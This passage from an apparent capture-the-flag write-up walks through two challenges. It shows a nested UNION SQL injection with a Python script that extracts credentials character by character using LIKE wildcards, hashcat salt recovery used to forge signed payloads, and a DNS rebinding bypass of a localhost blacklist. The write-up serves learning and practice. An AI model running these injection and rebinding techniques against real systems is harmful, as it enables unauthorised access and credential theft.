('user\n', '--', u'https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcL3VzZXIiLCJhdXRoIjoiYmZiNmRkMDRlNjZlODU1NjRkZWJiYTNlN2IyMjJlMzQifQ==')
```

The `password` and `username` gave me status code `204` not on the request but as the content. And if we checkout the `/api` table it says that `204` means `Successful request but with no data found` that means we just need to find the valid `username` and `password` to get the information/data.

For this I downloaded users.txt and rockyou.txt from SecList and tried to find the valid values one at a time. After hours of long run when I didn't find anything `@xEHLE` told me that I will never find those credential in any list and I need to find some other way. They also said `also think about how a lot of username lookups work`.

Now the way most looks usually works in DB are something like:

```sql
SELECT user FROM TABLE_NAME WHERE user="THE INPUT WE GIVE"
```

something like that but the problem is if that was the case then I think using wordlist would have worked. That is why the best way lookups would work in this case is if someone internally is using something like:

```sql
SELECT user FROM table_name WHERE user LIKE '<user_input>'
```

And I can see the issue with this, the problem is that now if user input is `a%` it might just return `TRUE`. To try this I modified my query in my script.

```python
import requests
from bs4 import BeautifulSoup

HOST = "https://hackyholidays.h1ctf.com"
hash_URL = "https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=-8436%27%20UNION%20SELECT%20"1%27%20UNION%20SELECT%20%27rad.jpg%27,1,%27../api/user?username={}%%27%20--%20-",%2712%27,1--%20-"

strings = "0123456789abcdefghijklmnopqrstuvwxyz_"

for endpoint in strings:
    r = requests.get(hash_URL.format(endpoint.strip()))
    soup = BeautifulSoup(r.content, "html.parser")
    next_url = soup.findAll("img", {"class": "img-responsive"})
    if next_url:
        new_url = HOST + next_url[-1]["src"]
        nr = requests.get(new_url)
        if nr.content != "Expected HTTP status 200, Received: 204":
            print(endpoint, "--", new_url)
```

P.S - This script doesn't work recursively so it finds one character and then I would add that character and rerun the script. At this point I was loosing my mind and didn't wanted to miss anything so I decided to go slow :)

Major change to notice in this is the query:

```
-8436' UNION SELECT "1' UNION SELECT 'rad.jpg',1,'../api/user?username={}%' -- -",'12',1-- -
```

With the help of this script I found one character at a time, the username was `grinchadmin` and in the similar way I found the password. The change in the query was just a bit:

```
-8436' UNION SELECT "1' UNION SELECT 'rad.jpg',1,'../api/user?username=grinchadmin%26password={}%' -- -",'12',1-- -
```

one character at a time I found the password i.e `s4nt4sucks`

Using these credentials I logged in to the attack box(https://hackyholidays.h1ctf.com/attack-box/login)

{F1129473}

Thanks to @neolex @mcipekci @xEHLE and every one who gave hint for this challenge I don't think I could have done this alone.

# Flag 12

For this we start from the very same page on which we found the flag for 11th challenge. We can see that there are three IP and red buttons to attack those.

If we click on any of those buttons then a new tab opens up which shows that some ping requests were sent

{F1129482}

Now if we look at href in those `ATTACK` buttons they looks like:

```
https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiIyMDMuMC4xMTMuMzMiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQ==
```

Decoded base64 looks like:

```json
{"target":"203.0.113.33","hash":"5f2940d65ca4140cc18d0878bc398955"}                                                                                                     
```

Now as we can see there is a target and a hash, so I checked if the hash is the `md5` of the `target` value but it wasn't. I tried replacing the hash but got nothing but errors. If the hash is of the target then there is a possibility that it was salted meaning if we calculate the md5 without hash it will be different.

To test this I decided to use hashcat and see if I can recover any `salt`

```bash
hashcat -m 10 -O hash.txt rockyou.txt -o hash.out
```

{F1129483}

we can see that we found the salt to be `mrgrinch463` this means that now we can generate our own target. So the very first one that I tried was `hackyholidays.h1ctf.com`

I used [this](http://md5.my-addr.com/md5_salted_hash-md5_salt_hash_generator_tool.php) to generate the hash and then base64 encoded it to send it to the URL.

```json
{"target":"hackyholidays.h1ctf.com","hash":"59bcc3074be23595ebb5e4259abc0de6"}
```

```
https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiJoYWNreWhvbGlkYXlzLmgxY3RmLmNvbSIsImhhc2giOiI1OWJjYzMwNzRiZTIzNTk1ZWJiNWU0MjU5YWJjMGRlNiJ9
```

But the attack was aborted because it detected that `Local target` was being attacked. So the next step is clear we need to bypass this so we can attack the `localhost` cause that is the house of `grinch` and we need to destroys grinch network.

{F1129484}

In the above image we see an attack happening on `192.168.1.1.xip.io` what we can understand from this is:
1) The input target is first resolved.
2) `Spinning up botnet` is when the system checks wether the `target` is localhost or not.
3) Then we see it says: `Launching attack against: 192.168.1.1.xip.io / 192.168.1.1` that means it launched the attack on the `target` that was provided by the user as an input instead of using the host which is receives in STEP-1 after resolving.

If we have to write a pseudo code for this kind of functionality it would look like:

```
BLACKLIST = ["127.0.0.1", "OR WHATEVER YOU WANT"]
if RESOLVE($user_input) != BLACKLIST:
	Launch_attack_on($user_input)
```

***

This is like first we sanitize something and then we use the unsanitized input. Now we know what the problem is we just need to find a way to exploit it. This kind of vulnerabilities are known as[ `TOCTOU`(Time of check, Time of use)](https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use). 

The specific way to exploit the vulnerability we need to use [`DNS rebinding`](https://en.wikipedia.org/wiki/DNS_rebinding). In simple way `DNS rebinding` is type of TOCTOU in which a certain `domain` resolves to something and when the same domain is resolved again it would resolve to something.

Ex: I found this service called [1u.ms](http://1u.ms/)

```
host -t A make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms
```

{F1129485}

We can see how a single domain first resolves to `1.2.3.4` and then it resolves to `169.254.169.254`.

***

We have to do the same kind of attack so first our domain will resolve to any random IP which will pass the blacklist but later when the attack is lauched it will resolve to `127.0.0.1` putting down the grinch's network.

I tried to use something like `make-1.2.3.4-rebind-127.0.0.1-rr.1u.ms` which will resolve to `1.2.3.4` first and then `localhost` later. I generated the hash for this and base64 encoded it and then passed it in the `payload` parameter but it didn't work. It wouldn't resolve to `127.0.0.1`. I tried the same process various time but nothing. So I felt that this(`1u.ms`) must be the problem and then I googled `dns rebinding service`.  The first URL that we get is https://lock.cmpxchg8b.com/rebinder.html, this service says that it will take two IP and will then resolve randomly to any of these IP's

I used `1.2.3.4` in the `A` and `127.0.0.1` to B

{F1129486}

and then got `01020304.7f000001.rbndr.us`. So I used this as the target and generated the hash for this target using `mrgrinch463` salt using [this](http://md5.my-addr.com/md5_salted_hash-md5_salt_hash_generator_tool.php) website.

```json
{"target":"01020304.7f000001.rbndr.us","hash":"69c31cdcfad3ef1deb652f4aca52d2cc"}
```

Then I used [cyberchef recipe](https://gchq.github.io/CyberChef/#recipe=To_Base64('A-Za-z0-9%2B/%3D')&input=eyJ0YXJnZXQiOiIwMTAyMDMwNC43ZjAwMDAwMS5yYm5kci51cyIsImhhc2giOiI2OWMzMWNkY2ZhZDNlZjFkZWI2NTJmNGFjYTUyZDJjYyJ9) to base64 encode this.

The final URL looked like:

```
https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiIwMTAyMDMwNC43ZjAwMDAwMS5yYm5kci51cyIsImhhc2giOiI2OWMzMWNkY2ZhZDNlZjFkZWI2NTJmNGFjYTUyZDJjYyJ9
```

I had to paste this URL various time since it would randomly resolve to `127.0.0.1` sometime and check would fail but in the end I got it.

{F1129490}

{F1129487}

🎉🎉🎉🎉

## Impact

This CTF was amazing. I really enjoyed it, learned loads of stuff and would really like to thank @adam for making this awesome CTF. Thanks to @neolex @0xatul @shamollash @xEHLE and everyone who gave any kind of hint or helped me in any way. I xouldn't have solve this all by my self.

## Attachments
- tweet1.png
- flag-2.png
- flag2-2.png
- flag3-2.png
- flag3-1.png
- flag3.png
- flag4-1.png
- flag4-2.png
- flag4-4.png
- flag4-3.png
- flag4.png
- flag5-1.png
- flag5-2.png
- flag5-3.png
- flag5-4.png
- flag5-5.png
- tweet2.png
- flag6.png
- tweet3.png
- flag7-1.png
- flag7-2.png
- flag7.png
- tweet4.png
- flag8-1.png
- flag8-2.png
- flag8-4.png
- flag8-3.png
- flag8-5.png
- flag8.png
- tweet5.png
- flag9.png
- flag9-1.png
- tweet6.png
- flag10-2.png
- flag10-3.png
- flag10-1.png
- flag10.png
- tweet7.png
- flag11-1.png
- flag11-3.png
- flag11-5.png
- flag11-4.png
- flag11-6.png
- flag11-7.png
- flag11-8.png
- flag11-2.png
- flag11.png
- flag12-1.png
- flag12-2.png
- flag12-3.png
- flag12-4.png
- flag12-5.png
- flag12.png
- flag12.mp4
